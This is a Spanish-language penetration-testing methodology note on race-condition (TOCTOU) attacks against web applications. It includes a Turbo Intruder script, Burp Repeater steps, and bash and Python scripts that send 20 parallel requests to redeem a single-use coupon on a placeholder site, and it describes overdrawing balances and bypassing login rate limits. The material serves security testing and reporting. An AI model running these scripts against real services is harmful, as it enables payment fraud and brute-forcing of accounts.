# Race Conditions

## Objetivo
Explotar ventanas de tiempo entre la validación de una condición y su ejecución (TOCTOU) para obtener resultados no previstos.

## Señales de entrada
- Límites de uso único: cupones, códigos de descuento, tokens de un solo uso.
- Transferencias de dinero, puntos, créditos.
- Verificaciones de cuenta (email, teléfono).
- Reservas con stock limitado.
- Rate limiting implementado en aplicación (no en infra).
- Flujos de aprobación o publicación.

## Metodología

### Herramienta principal: Burp Suite — Turbo Intruder

#### Single-packet attack (HTTP/2) — el más efectivo
```python
# Turbo Intruder script para race condition
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)
    for i in range(20):
        engine.queue(target.req, lane='1')

def handleResponse(req, interesting):
    if req.status != 429:
        table.add(req)
```

#### Con Burp Repeater (HTTP/2)
1. Duplicar la request objetivo 20 veces en un grupo.
2. Send group → "Send group in parallel (single-packet attack)".
3. Analizar respuestas: más de una con éxito = race condition.

#### Con curl/Python como fallback
```bash
# Bash: lanzar requests en paralelo
for i in $(seq 1 20); do
  curl -s -X POST https://example.com/apply-coupon \
    -H "Authorization: Bearer TOKEN" \
    -d '{"code":"DISCOUNT50"}' &
done
wait
```

```python
# Python con threading
import requests, threading

def apply_coupon():
    r = requests.post(
        'https://example.com/apply-coupon',
        json={'code': 'DISCOUNT50'},
        headers={'Authorization': 'Bearer TOKEN'}
    )
    print(r.status_code, r.text)

threads = [threading.Thread(target=apply_coupon) for _ in range(20)]
for t in threads: t.start()
for t in threads: t.join()
```

## Escenarios típicos

### Cupón de un solo uso
- Enviar 20 requests simultáneas de canje.
- Si más de una devuelve éxito → race condition.

### Límite de retiro/transferencia
- Iniciar múltiples withdrawals simultáneos.
- Si el balance queda negativo o se retira más del saldo → race.

### Verificación de email
- Cambiar email mientras el token de verificación está activo.
- Verificar con token antiguo después del cambio.

### Rate limit bypass
- Si el rate limit se comprueba en aplicación y no en infraestructura.
- Single-packet attack puede saltarse la ventana de conteo.

## Impacto alto
- Obtener descuentos/beneficios múltiples con un único código.
- Retirar más dinero del disponible (balance negativo).
- Bypass de rate limiting en login → fuerza bruta.
- Publicar contenido sin aprobación.

## Evidencia mínima
- Capturas de múltiples responses exitosas con el mismo request.
- Estado final del sistema mostrando el efecto (balance, descuento aplicado N veces).
- Timestamps de las requests demostrando la simultaneidad.
